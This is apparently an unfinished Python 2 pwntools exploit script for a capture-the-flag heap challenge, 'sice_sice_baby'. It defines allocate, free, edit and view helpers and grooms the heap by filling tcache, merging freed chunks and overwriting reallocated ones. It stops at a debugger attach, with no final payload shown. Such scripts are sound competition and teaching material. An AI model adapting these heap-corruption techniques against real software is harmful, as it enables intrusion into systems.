#!python2
from pwn import *
import sys
import os

remote_ip,port = 'dicec.tf',31904

binary = ['./sice_sice_baby']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})


def add(size):
    sla("> ","1")
    sla("> ",str(size))


def free(idx):
    sla("> ","2")
    sla("> ",str(idx))

def edit(idx,data):
    sla("> ","3")
    sla("> ",str(idx))
    sa("> ",data)


def view(idx):
    sla("> ","4")
    sla("> ",str(idx))

if __name__ == "__main__":
    for i in range(7):
        add(0x80)    # 5 merger, 6 middle
    add(0x10)        # 7
    add(0x80)        # 8
    add(0x10)        # 9
    add(0x80)        # 10
    add(0x10)        # 11
    add(0x80)        # 12
    add(0x10)        # 13
    add(0x80)        # 14
    add(0x10)        # 15
    add(0x80)        # 16
    add(0x10)        # 17
    for i in range(5):
        free(i)
    free(14)
    free(16)       # filling tcache
    free(12)
    free(6)
    free(10)
    free(8)
    add(0x90)      # 0
    free(5)
    add(0x10)      # 1
    free(7)
    free(1)
    add(0x10)     # 1
    #edit(1,"\x00")
    for i in range(7):
        add(0x80)     # 2-8
    add(0x80)        # 10
    edit(10,"\x00"*8)
    gdb.attach(io)
    io.interactive()
